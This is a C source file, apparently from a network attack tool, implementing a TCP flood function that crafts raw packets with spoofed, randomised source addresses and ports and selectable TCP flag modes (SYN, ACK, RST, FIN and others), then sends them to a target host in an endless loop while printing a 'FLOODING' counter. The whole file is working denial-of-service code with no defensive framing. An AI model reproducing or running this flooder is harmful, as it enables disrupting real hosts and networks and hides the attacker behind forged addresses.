#ifndef TCP_HEADER
#define TCP_HEADER

#include "RIP.c"

//TCP Flooder
void TCPFlood()
{
    //Set-up Time Logger
    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);

    //Declaring Datagram and Source IP Variables
    char datagram[4096], source_ip[32];
    
    //IP Header
    struct iphdr* ip_header = (struct iphdr*)datagram;
    
    //TCP Header
    struct tcphdr* tcp_header = (struct tcphdr*)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    
    //Setting Base Source IP 
    strcpy(source_ip, "1.1.1.1");
   
    //Setting Up Socket Configuration
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
     
    //Zero Out the Buffer
    memset(datagram, 0, 4096);
     
    //Fill in the IP Header
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); //Total Packet Lenght
    ip_header->id = htons(1);
    ip_header->frag_off = 0;
    ip_header->ttl = 255; //Setting Time-To-Live
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0; //Set to 0 before calculating Checksum
    ip_header->saddr = inet_addr(source_ip); //Spoof the Source IP Address
    ip_header->daddr = sin.sin_addr.s_addr;
     
    ip_header->check = Checksum((unsigned short*)datagram, ip_header->tot_len >> 1);
     
    //TCP Header
    tcp_header->source = htons(1234);
    tcp_header->dest = htons(target_port);
    tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->syn = 0;
    tcp_header->ack = 0;
    tcp_header->fin = 0;
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->urg = 0;
    tcp_header->window = htons(5840); //Maximum size
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;
    
    switch (attack_mode)
    {
        case 1:
        tcp_header->syn = 1;
            break;
        case 2:
        tcp_header->ack = 1;
            break;
        case 3:
        tcp_header->syn = 1;
        tcp_header->ack = 1;
        case 4:
        tcp_header->rst = 1;
            break;
        case 5:
        tcp_header->psh = 1;
            break;
        case 6:
        tcp_header->urg = 1;
            break;
        case 7:
        tcp_header->fin = 1;
            break;
        case 8:
        tcp_header->fin = 1;
        tcp_header->ack = 1;
            break;
        default:
        tcp_header->syn = 1;
            break;
    }
    
    //IP Checksum 
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp, tcp_header, sizeof(struct tcphdr));
    tcp_header->check = Checksum((unsigned short*)&psh, sizeof(struct pseudo_header));
     
    int one = 1;
    const int* val = &one;
    
    int f1 = 0, f2 = 0, f3 = 0, f4 = 0, new_port = 0;
    char new_source_ip[32];

    while (1)
    {
        //Create a Raw Socket
        int skt = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

        if (skt == -1)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Could Not Create Socket.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
            exit(0);
        }

        if (setsockopt(skt, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Error While Setting IP_HDRINCL. Error number : %d . Error message : %s \n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL, errno, strerror(errno));
            close(skt);
            exit(0);
        }

        RandomIP(&f1, &f2, &f3, &f4, &new_port); //Generate the new Spoofed IP and Port
        sprintf(new_source_ip, "%d.%d.%d.%d", f1, f2, f3, f4);
        
        strcpy(source_ip, new_source_ip); //Copy new generated IP into previous IP
        ip_header->saddr = inet_addr(source_ip); //Spoof the Source IP address
        tcp_header->source = htons(new_port); //Spoof the source port
        
    	ip_header->id = htons(rand() % 65535);
        tcp_header->seq = htonl(rand() % 4294967294); //Randomize Sequence Number
        tcp_header->ack_seq = htonl(rand() % 4294967294); //Randomize Acknowledged Sequence Number
    

        //Send the packet
        if (sendto(skt, datagram, ip_header->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Send Failed.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
        }
        
        printf("\r %s[%sFLOODING%s] Sent %d %sPackets...", COLOR_WHITE, COLOR_RED, COLOR_WHITE, packet_count, COLOR_WHITE);
        fflush(stdout);
        packet_count++;
        usleep(1);
        close(skt);
    }
}

#endif
